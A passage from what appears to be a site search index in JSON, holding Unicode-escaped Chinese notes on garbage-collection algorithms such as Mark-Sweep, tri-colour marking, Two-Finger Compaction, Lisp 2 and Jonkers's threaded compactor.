\u200b\u7528\u4e8e\u200b\u5bfb\u627e\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\u7684\u200b\u6839\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u901a\u5e38\u200b\u5305\u62ec\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8c03\u7528\u200b\u6808\u200b\u548c\u200b\u5168\u5c40\u53d8\u91cf\u200b\uff0c\u200b\u901a\u8fc7\u200b\u8fd9\u4e9b\u200b\u7ed3\u70b9\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff1b\u200b\u65e0\u6cd5\u200b\u901a\u8fc7\u200b\u6839\u200b\u7ed3\u70b9\u200b\u8bbf\u95ee\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u5219\u200b\u662f\u200b\u4e0d\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b</li> <li>interior pointer: \u200b\u6307\u9488\u200b\u6307\u5411\u200b\u67d0\u4e2a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u4e2d\u95f4\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u5bf9\u8c61\u200b\u5f00\u5934\u200b</li> <li>read/write barrier\uff1a\u200b\u5728\u200b read/write \u200b\u64cd\u4f5c\u200b\u7684\u200b\u9644\u8fd1\u200b\uff0c\u200b\u63d2\u5165\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u64cd\u4f5c\u200b\u7528\u4e8e\u200b\u5783\u573e\u200b\u56de\u6536\u200b</li> </ul>"},{"location":"software/gc.html#mark-sweep","title":"Mark-Sweep","text":"<p>Mark-Sweep \u200b\u5783\u573e\u200b\u56de\u6536\u200b\u5206\u4e3a\u200b\u4e24\u4e2a\u200b\u9636\u6bb5\u200b\uff1a</p> <ul> <li>Mark \u200b\u9636\u6bb5\u200b\uff1a\u200b\u4ece\u200b GC root \u200b\u5f00\u59cb\u200b\uff0c\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\u5e76\u200b\u6807\u8bb0\u200b</li> <li>Sweep \u200b\u9636\u6bb5\u200b\uff1a\u200b\u626b\u63cf\u200b\u5806\u4e2d\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u628a\u200b\u6ca1\u6709\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\u91ca\u653e\u200b\u6389\u200b</li> </ul> <p>\u200b\u5bf9\u8c61\u200b\u662f\u5426\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u6807\u8bb0\u200b\u53ef\u4ee5\u200b\u548c\u200b\u5bf9\u8c61\u200b\u653e\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5355\u72ec\u200b\u4ee5\u200b\u7c7b\u4f3c\u200b bitmap \u200b\u7684\u200b\u65b9\u5f0f\u200b\u4fdd\u5b58\u200b\u3002Sweep \u200b\u9636\u6bb5\u200b\u4e5f\u200b\u672a\u5fc5\u200b\u8981\u200b\u6bcf\u6b21\u200b Mark \u200b\u5b8c\u200b\u5c31\u200b\u53bb\u200b\u505a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u505a\u200b\u5f97\u200b\u66f4\u200b Lazy\u3002</p>"},{"location":"software/gc.html#tri-colour","title":"\u4e09\u200b\u8272\u200b\u6807\u8bb0\u200b Tri-colour","text":"<p>\u200b\u4e09\u200b\u8272\u200b\u6807\u8bb0\u200b\uff08tri-colour\uff09\u200b\u662f\u200b\u8bb0\u5f55\u200b\u5bf9\u8c61\u200b\u5728\u200b Mark \u200b\u9636\u6bb5\u200b\u7684\u200b\u4e09\u79cd\u200b\u72b6\u6001\u200b\uff1a</p> <ul> <li>\u200b\u9ed1\u8272\u200b\uff1a\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5df2\u7ecf\u200b Mark \u200b\u5b8c\u6210\u200b</li> <li>\u200b\u7070\u8272\u200b\uff1a\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u4f46\u200b\u8fd8\u200b\u6ca1\u200b Mark \u200b\u5b8c\u6210\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u904d\u5386\u200b</li> <li>\u200b\u767d\u8272\u200b\uff1a\u200b\u8fd8\u200b\u6ca1\u200b Mark \u200b\u5230\u200b\uff0c\u200b\u6216\u8005\u200b\u662f\u975e\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b</li> </ul> <p>\u200b\u5728\u200b Mark \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u628a\u200b GC root \u200b\u91cc\u9762\u200b\u7684\u200b\u5bf9\u8c61\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u9ed1\u8272\u200b\uff0c\u200b\u628a\u200b\u5b83\u4eec\u200b\u5f15\u7528\u200b\u7684\u200b\u5bf9\u8c61\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u7070\u8272\u200b\uff0c\u200b\u63a5\u7740\u200b\u53bb\u200b\u641c\u7d22\u200b\u8fd9\u4e9b\u200b\u7070\u8272\u200b\u7684\u200b\u5bf9\u8c61\u200b\u5f15\u7528\u200b\u7684\u200b\u5176\u4ed6\u200b\u5bf9\u8c61\u200b\u3002\u200b\u5728\u200b\u904d\u5386\u200b\u7070\u8272\u200b\u5bf9\u8c61\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u9ed1\u8272\u200b\uff1b\u200b\u5f53\u200b\u6240\u6709\u200b\u7070\u8272\u200b\u90fd\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u9ed1\u8272\u200b\u65f6\u200b\uff0cMark \u200b\u7ed3\u675f\u200b\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b\u7070\u8272\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b\u641c\u7d22\u200b\u7684\u200b frontier\u3002</p>"},{"location":"software/gc.html#mark-compact","title":"Mark-Compact","text":"<p>Mark-Compact \u200b\u5783\u573e\u200b\u56de\u6536\u200b\u5206\u4e3a\u200b\u4e24\u4e2a\u200b\u9636\u6bb5\u200b\uff1a</p> <ul> <li>Mark \u200b\u9636\u6bb5\u200b\uff1a\u200b\u4ece\u200b GC root \u200b\u5f00\u59cb\u200b\uff0c\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u6d3b\u8dc3\u200b\u5bf9\u8c61\u200b\u5e76\u200b\u6807\u8bb0\u200b</li> <li>Compact \u200b\u9636\u6bb5\u200b\uff1a\u200b\u626b\u63cf\u200b\u5e76\u200b\u79fb\u52a8\u200b\u5806\u4e2d\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5b83\u4eec\u200b\u7d27\u51d1\u200b\u5730\u200b\u4fdd\u5b58\u200b\u5728\u200b\u4e00\u8d77\u200b</li> </ul>"},{"location":"software/gc.html#two-finger-compaction","title":"Two-Finger Compaction","text":"<p>Two-Finger Compaction \u200b\u662f\u200b\u4e00\u79cd\u200b Mark-Compact \u200b\u7684\u200b Compact \u200b\u9636\u6bb5\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5b83\u200b\u9700\u8981\u200b\u7ef4\u62a4\u200b\u4e24\u4e2a\u200b\u6307\u9488\u200b\uff1a\u200b\u4e00\u4e2a\u200b\u6307\u9488\u200b <code>free</code> \u200b\u4e00\u200b\u5f00\u59cb\u200b\u6307\u5411\u200b\u5806\u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u4ece\u524d\u200b\u5f80\u540e\u200b\u53bb\u200b\u5bfb\u627e\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u53ef\u4ee5\u200b\u5b58\u653e\u200b\u5bf9\u8c61\u200b\u7684\u200b\u7a7a\u95f2\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff1b\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6307\u9488\u200b <code>scan</code> \u200b\u4e00\u200b\u5f00\u59cb\u200b\u6307\u5411\u200b\u5806\u200b\u7684\u200b\u7ed3\u5c3e\u200b\uff0c\u200b\u4ece\u540e\u200b\u5f80\u524d\u200b\u53bb\u200b\u5bfb\u627e\u200b\u9700\u8981\u200b\u88ab\u200b\u632a\u5230\u200b\u524d\u9762\u200b\u7684\u200b\u5bf9\u8c61\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u7b97\u6cd5\u200b\u5206\u4e3a\u200b\u4e24\u8f6e\u200b\uff0c\u200b\u7b2c\u4e00\u8f6e\u200b\u662f\u200b\u79fb\u52a8\u200b\u5bf9\u8c61\u200b\uff1a</p> <ol> <li>\u200b\u9012\u589e\u200b <code>free</code> \u200b\u6307\u9488\u200b\uff0c\u200b\u76f4\u5230\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u53ef\u4ee5\u200b\u5b58\u653e\u200b\u5bf9\u8c61\u200b\u7684\u200b\u7a7a\u95f2\u200b\u7684\u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u9012\u51cf\u200b <code>scan</code> \u200b\u6307\u9488\u200b\uff0c\u200b\u76f4\u5230\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u9700\u8981\u200b\u88ab\u200b\u632a\u5230\u200b\u524d\u9762\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff08\u200b\u8981\u6c42\u200b <code>scan &gt; free</code>\uff09</li> <li>\u200b\u628a\u200b\u5904\u4e8e\u200b <code>scan</code> \u200b\u6307\u9488\u200b\u7684\u200b\u5bf9\u8c61\u200b\u79fb\u52a8\u200b\u5230\u200b <code>free</code> \u200b\u6307\u5411\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> <li>\u200b\u56e0\u4e3a\u200b\u53ef\u80fd\u200b\u6709\u200b\u5176\u4ed6\u200b\u5bf9\u8c61\u200b\u62e5\u6709\u200b\u5bf9\u200b <code>scan</code> \u200b\u6307\u5411\u200b\u7684\u200b\u5bf9\u8c61\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u540e\u7eed\u200b\u6307\u9488\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u6b63\u786e\u200b\u5730\u200b\u66f4\u65b0\u200b\uff0c\u200b\u5728\u200b <code>scan</code> \u200b\u6307\u9488\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u7559\u4e0b\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b <code>free</code> \u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8868\u793a\u200b\u4e4b\u524d\u200b\u5728\u200b <code>scan</code> \u200b\u6307\u9488\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u8fd9\u91cc\u200b\u6709\u4e2a\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u73b0\u5728\u200b\u88ab\u200b\u632a\u5230\u200b\u4e86\u200b <code>free</code> \u200b\u8fd9\u4e2a\u200b\u4f4d\u7f6e\u200b</li> <li>\u200b\u5faa\u73af\u200b\u4ee5\u4e0a\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u76f4\u5230\u200b\u6240\u6709\u200b\u5bf9\u8c61\u200b\u90fd\u200b\u88ab\u200b\u7d27\u5bc6\u200b\u5730\u200b\u4fdd\u5b58\u200b\uff0c\u200b\u6b64\u65f6\u200b <code>free &gt;= scan</code></li> </ol> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u6709\u70b9\u50cf\u200b\u5feb\u901f\u200b\u6392\u5e8f\u200b\u91cc\u200b\u7684\u200b partition\uff1a\u200b\u5feb\u901f\u200b\u6392\u5e8f\u200b\u91cc\u200b\uff0cpartition \u200b\u5c31\u662f\u200b\u628a\u200b\u5de6\u8fb9\u200b\u5c0f\u4e8e\u200b pivot \u200b\u7684\u200b\u5143\u7d20\u200b\u548c\u200b\u53f3\u8fb9\u200b\u5927\u4e8e\u200b pivot \u200b\u7684\u200b\u5143\u7d20\u200b\u4ea4\u6362\u200b\uff1b\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u628a\u200b\u5de6\u8fb9\u200b\u7684\u200b\u7a7a\u4f4d\u200b\u548c\u200b\u53f3\u8fb9\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4ea4\u6362\u200b\u3002\u200b\u6700\u540e\u200b\u4e24\u8fb9\u200b\u6307\u9488\u200b\u6c47\u5408\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u610f\u5473\u7740\u200b\u4ea4\u6362\u200b\u7ed3\u675f\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\u5bf9\u8c61\u200b\u5df2\u7ecf\u200b\u88ab\u200b Compact \u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u5f88\u591a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u6307\u9488\u200b\u8fd8\u200b\u6307\u5411\u200b\u4e86\u200b\u65e7\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u7b2c\u4e8c\u8f6e\u200b\uff0c\u200b\u5373\u200b\u66f4\u65b0\u200b\u6307\u9488\u200b\uff1a\u200b\u904d\u5386\u200b\u5404\u4e2a\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u6307\u5411\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u88ab\u200b\u632a\u8d70\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u628a\u200b\u5730\u5740\u200b\u6539\u6210\u200b\u5b83\u200b\u7684\u200b\u65b0\u200b\u4f4d\u7f6e\u200b\uff1a\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7b2c\u56db\u6b65\u200b\u7559\u4e0b\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u628a\u200b\u6307\u9488\u200b\u6539\u4e3a\u200b\u5b83\u200b\u76ee\u524d\u200b\u6240\u5728\u200b\u7684\u200b\u65b0\u200b\u7684\u200b\u5730\u5740\u200b\u5373\u53ef\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u7b97\u6cd5\u200b\u5728\u200b\u5bf9\u8c61\u200b\u5927\u5c0f\u200b\u90fd\u200b\u4e00\u6837\u200b\u7684\u200b\u65f6\u5019\u200b\u6bd4\u8f83\u200b\u597d\u7528\u200b\uff0c\u200b\u4e0d\u7136\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b <code>scan</code> \u200b\u6307\u5411\u200b\u7684\u200b\u5bf9\u8c61\u200b\u592a\u200b\u5927\u200b\uff0c\u200b\u653e\u4e0d\u8fdb\u200b <code>free</code> \u200b\u6307\u5411\u200b\u7684\u200b\u7a7a\u9699\u200b\u4e2d\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002</p>"},{"location":"software/gc.html#lisp-2","title":"Lisp 2","text":"<p>Lisp 2 \u200b\u662f\u200b\u53e6\u200b\u4e00\u79cd\u200b Compact \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u548c\u200b Two-Finger Compaction \u200b\u6709\u200b\u4e00\u4e9b\u200b\u50cf\u200b\uff0c\u200b\u4f46\u200b\u5b83\u200b\u5206\u4e3a\u200b\u4e09\u4e2a\u200b\u6b65\u9aa4\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u4e2a\u200b\u6b65\u9aa4\u200b\u662f\u200b computeLocations\uff0c\u200b\u5730\u5740\u200b\u4ece\u200b\u4f4e\u200b\u5f80\u200b\u9ad8\u200b\u904d\u5386\u200b\uff0c\u200b\u7ed9\u200b\u6bcf\u4e2a\u200b\u6d3b\u8dc3\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u6309\u200b\u5730\u5740\u200b\u4ece\u200b\u4f4e\u200b\u5f80\u200b\u9ad8\u200b\u987a\u5e8f\u200b\u5206\u914d\u200b compact \u200b\u540e\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5b83\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5730\u5740\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b\u5bf9\u8c61\u200b\u7684\u200b forwardingAddress \u200b\u5b57\u6bb5\u200b\u4e2d\u200b\uff0c\u200b\u5373\u200b\u8fd9\u4e2a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u65b0\u200b\u5730\u5740\u200b</li> <li>\u200b\u7b2c\u4e8c\u4e2a\u200b\u6b65\u9aa4\u200b\u662f\u200b updateReferences\uff0c\u200b\u66f4\u65b0\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u628a\u200b\u5404\u5b57\u200b\u6bb5\u200b\u7684\u200b\u6307\u9488\u200b\u6539\u6210\u200b\u5bf9\u5e94\u200b\u5bf9\u8c61\u200b\u7684\u200b forwardingAddress\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u53bb\u200b\u6307\u5411\u200b\u65b0\u200b\u7684\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u7b2c\u4e09\u4e2a\u200b\u6b65\u9aa4\u200b\u662f\u200b relocate\uff0c\u200b\u5373\u200b\u6309\u7167\u200b\u5730\u5740\u200b\u4ece\u200b\u4f4e\u200b\u5f80\u200b\u9ad8\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u628a\u200b\u5404\u200b\u5bf9\u8c61\u200b\u632a\u5230\u200b\u7b2c\u4e00\u6b65\u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u200b\u597d\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\uff1b\u200b\u5730\u5740\u200b\u7684\u200b\u5206\u914d\u200b\u548c\u200b\u79fb\u52a8\u200b\u987a\u5e8f\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u79fb\u52a8\u200b\u7684\u200b\u65f6\u5019\u200b\u4e0d\u4f1a\u200b\u8986\u76d6\u200b\u6389\u200b\u4e0d\u8be5\u200b\u8986\u76d6\u200b\u7684\u200b\u5bf9\u8c61\u200b</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u5bf9\u8c61\u200b\u5728\u200b\u5806\u200b\u4e2d\u200b\u7684\u200b\u76f8\u5bf9\u200b\u987a\u5e8f\u200b\u88ab\u200b\u4fdd\u7559\u200b\u4e86\u200b\u4e0b\u6765\u200b\uff0c\u200b\u56e0\u6b64\u200b\u7f13\u5b58\u200b\u5c40\u90e8\u6027\u200b\u4f1a\u200b\u597d\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u4ee3\u4ef7\u200b\u662f\u200b\u6bcf\u4e2a\u200b\u5bf9\u8c61\u200b\u8981\u200b\u591a\u200b\u4fdd\u5b58\u200b\u4e00\u4e2a\u200b forwardingAddress \u200b\u6307\u9488\u200b\uff1b\u200b\u800c\u200b Two-Finger Compaction \u200b\u7b97\u6cd5\u200b\u4f1a\u200b\u6253\u4e71\u200b\u5bf9\u8c61\u200b\u4e4b\u95f4\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u7f13\u5b58\u200b\u5c40\u90e8\u6027\u200b\u4e0d\u597d\u200b\u3002</p>"},{"location":"software/gc.html#jonkerss-threaded-compactor","title":"Jonkers\u2019s threaded compactor","text":"<p>Threaded compactor \u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u590d\u7528\u200b\u5df2\u6709\u200b\u7684\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53bb\u200b\u7ef4\u62a4\u200b forwardingAddress \u200b\u4fe1\u606f\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b Lisp 2 \u200b\u7b97\u6cd5\u200b\u7684\u200b\u989d\u5916\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u540c\u65f6\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u5bf9\u8c61\u200b\u4e4b\u95f4\u200b\u7684\u200b\u987a\u5e8f\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u590d\u7528\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <ol> <li>\u200b\u521d\u59cb\u72b6\u6001\u200b\u4e0b\u200b\uff0cA B C \u200b\u4e09\u4e2a\u200b\u5bf9\u8c61\u200b\u5206\u522b\u200b\u6709\u5b57\u6bb5\u200b\u6307\u5411\u200b\u4e86\u200b N\uff0c\u200b\u6b64\u65f6\u200b\u65e0\u6cd5\u200b\u4ece\u200b N \u200b\u77e5\u9053\u200b\u6709\u200b\u54ea\u4e9b\u200b\u5b57\u200b\u6bb5\u200b\u5f15\u7528\u200b\u4e86\u200b\u5b83\u200b</li> <li>\u200b\u901a\u8fc7\u200b\u904d\u5386\u200b\uff0c\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u94fe\u8868\u200b\uff1aN -&gt; C -&gt; B -&gt; A\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u628a\u200b\u5f15\u7528\u200b\u4e86\u200b N \u200b\u8fd9\u4e2a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u90fd\u200b\u653e\u5230\u200b\u4e00\u4e2a\u200b\u94fe\u8868\u200b\u91cc\u9762\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4ece\u200b N \u200b\u77e5\u9053\u200b\u6709\u200b\u54ea\u4e9b\u200b\u5b57\u200b\u6bb5\u200b\u5f15\u7528\u200b\u4e86\u200b N</li> <li>\u200b\u90a3\u4e48\u200b\u5728\u200b\u8981\u200b\u79fb\u52a8\u200b N \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u77e5\u9053\u200b N \u200b\u7684\u200b\u65b0\u200b\u5730\u5740\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u904d\u5386\u200b\u8fd9\u4e2a\u200b\u94fe\u8868\u200b\uff0c\u200b\u6062\u590d\u200b\u51fa\u200b\u539f\u6765\u200b\u7684\u200b\u8fde\u63a5\u200b\u5173\u7cfb\u200b\uff08\u200b\u5373\u200b A B C \u200b\u4e09\u4e2a\u200b\u5bf9\u8c61\u200b\u5206\u522b\u200b\u6709\u5b57\u6bb5\u200b\u6307\u5411\u200b\u4e86\u200b N\uff09\uff0c\u200b\u5e76\u200b\u4fee\u6b63\u200b A B C \u200b\u4e09\u4e2a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u8ba9\u200b\u5b83\u4eec\u200b\u6307\u5411\u200b N \u200b\u7684\u200b\u65b0\u200b\u5730\u5740\u200b</li> </ol> <p>\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u6709\u70b9\u50cf\u200b Morris Traversal\uff0c\u200b\u4e00\u79cd\u200b\u5728\u200b\u4e8c\u53c9\u6811\u200b\u4e0a\u200b O(1) \u200b\u7a7a\u95f4\u200b\u5f00\u9500\u200b\u7684\u200b\u4e2d\u5e8f\u200b\u904d\u5386\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u5229\u7528\u200b\u5df2\u6709\u200b\u7684\u200b\u6811\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u53bb\u200b\u6784\u5efa\u200b\u4e00\u6761\u200b\u56de\u6eaf\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u6808\u200b\u7684\u200b\u5185\u5b58\u200b\u5f00\u9500\u200b\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7b97\u6cd5\u200b\u7684\u200b\u4e09\u8f6e\u200b\u904d\u5386\u200b\uff1a</p> <ol> <li>\u200b\u7b2c\u4e00\u8f6e\u200b\uff0c\u200b\u904d\u5386\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u628a\u200b\u6307\u9488\u200b\u6539\u5199\u200b\u6210\u200b\u4e0a\u9762\u200b\u6240\u8ff0\u200b\u7684\u200b\u5f62\u5f0f\u200b\uff1b\u200b\u8fd9\u200b\u4e00\u8f6e\u200b\u8fc7\u540e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5bf9\u8c61\u200b\u90fd\u200b\u80fd\u200b\u627e\u5230\u200b\u81ea\u5df1\u200b\u88ab\u200b\u5f15\u7528\u200b\u7684\u200b\u6240\u6709\u200b\u5b57\u200b\u6bb5\u200b</li> <li>\u200b\u7b2c\u4e8c\u8f6e\u200b\uff0c\u200b\u518d\u6b21\u200b\u904d\u5386\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u7ed9\u200b\u5bf9\u8c61\u200b\u5206\u914d\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u6b64\u65f6\u200b\u901a\u8fc7\u200b\u94fe\u8868\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u5f15\u7528\u200b\u5f53\u524d\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u628a\u200b\u6307\u9488\u200b\u6539\u5199\u200b\u56de\u200b\u6b63\u786e\u200b\u7684\u200b\u8fde\u63a5\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5e76\u200b\u6539\u6210\u200b compact \u200b\u540e\u200b\u7684\u200b\u5730\u5740\u200b\uff1b\u200b\u8fd9\u200b\u4e00\u8f6e\u200b\u8fc7\u540e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u90fd\u200b\u6307\u5411\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u5bf9\u8c61\u200b\u7684\u200b\u65b0\u200b\u5730\u5740\u200b</li> <li>\u200b\u7b2c\u4e09\u8f6e\u200b\uff0c\u200b\u518d\u6b21\u200b\u904d\u5386\u200b\u5bf9\u8c61\u200b\uff0c\u200b\u628a\u200b\u5bf9\u8c61\u200b\u632a\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> </ol> <p>\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u8f6e\u200b\u904d\u5386\u200b\u53ef\u4ee5\u200b\u7b80\u5316\u200b\u4e3a\u200b\u4e24\u8f6e\u200b\u904d\u5386\u200b\u3002\u200b\u9996\u5148\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u8fd9\u200b\u4e09\u8f6e\u200b\u4e3a\u5565\u200b\u4e0d\u80fd\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\uff1a\u200b\u5982\u679c\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u7b2c\u4e00\u8f6e\u200b\u548c\u200b\u7b2c\u4e8c\u8f6e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u904d\u5386\u200b\u5bf9\u8c61\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5047\u8bbe\u200b\u4f9d\u7136\u200b\u662f\u200b\u6309\u7167\u200b\u5730\u5740\u200b\u4ece\u200b\u4f4e\u200b\u5230\u200b\u9ad8\u200b\u904d\u5386\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ea\u6709\u200b\u5730\u5740\u200b\u6bd4\u200b\u5b83\u200b\u4f4e\u200b\u7684\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\u5f15\u7528\u200b\u5b83\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5728\u200b\u94fe\u8868\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u800c\u200b\u5730\u5740\u200b\u6bd4\u200b\u5b83\u200b\u9ad8\u200b\u7684\u200b\u5bf9\u8c61\u200b\u7684\u200b\